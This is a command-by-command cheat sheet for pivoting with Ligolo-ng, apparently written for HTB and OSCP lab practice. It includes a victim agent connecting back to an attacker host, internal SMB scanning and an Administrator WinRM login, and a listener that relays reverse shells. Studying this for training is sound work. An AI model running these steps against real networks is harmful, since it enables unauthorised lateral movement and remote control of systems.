# Ligolo-ng Setup and Usage

Modern pivoting tool — cleaner than chisel for complex networks, no proxychains overhead.

## Download

```bash
# https://github.com/nicocha30/ligolo-ng/releases
# Two binaries: proxy (attacker), agent (victim)

# Attacker — proxy binary
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64.tar.gz
tar xzf proxy_linux_amd64.tar.gz

# Victim — agent binary (grab correct arch: linux/windows amd64/arm)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64.tar.gz
```

## Attacker Setup

```bash
# Create TUN interface (one time)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy server (self-signed cert for labs)
sudo ./proxy -selfcert
# Listening on 0.0.0.0:11601
```

## Victim Agent Connection

```bash
# On victim — connect back to attacker
./agent -connect attacker_ip:11601 -ignore-cert

# Windows victim
.\agent.exe -connect attacker_ip:11601 -ignore-cert
```

## Start the Tunnel

In the ligolo-ng proxy interface:

```
ligolo-ng » session
# Select your agent (number)

[Agent: victim_hostname] » start
# Tunnel is now active
```

## Add Route to Internal Network

```bash
# On attacker — route internal subnet through ligolo TUN interface
sudo ip route add 172.16.0.0/24 dev ligolo

# Verify
ip route show | grep ligolo
```

Now access internal hosts directly — no proxychains needed.

```bash
# Direct access — no proxychains prefix required
nmap -sV -p 80,443,445 172.16.0.100
nxc smb 172.16.0.0/24
curl http://172.16.0.100/
evil-winrm -i 172.16.0.100 -u Administrator -p 'Pass123'
```

## Multi-Network Routing

```bash
# Add multiple subnets as you discover them
sudo ip route add 10.10.20.0/24 dev ligolo
sudo ip route add 192.168.100.0/24 dev ligolo
```

## Listener for Reverse Shells from Internal Hosts

```bash
# In ligolo interface — add listener so internal hosts can reach your attacker
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# Internal host connects to pivot:4444 → forwarded to attacker:4444
```

## Cleanup

```bash
sudo ip route del 172.16.0.0/24 dev ligolo
sudo ip link set ligolo down
```

## Practice

- HTB Academy "Pivoting, Tunneling, and Port Forwarding" module uses ligolo-ng throughout
- Preferred tool for OSCP exam over chisel for complex multi-subnet scenarios

Ethical note: only use on authorized systems — ligolo-ng agents are persistent until killed.
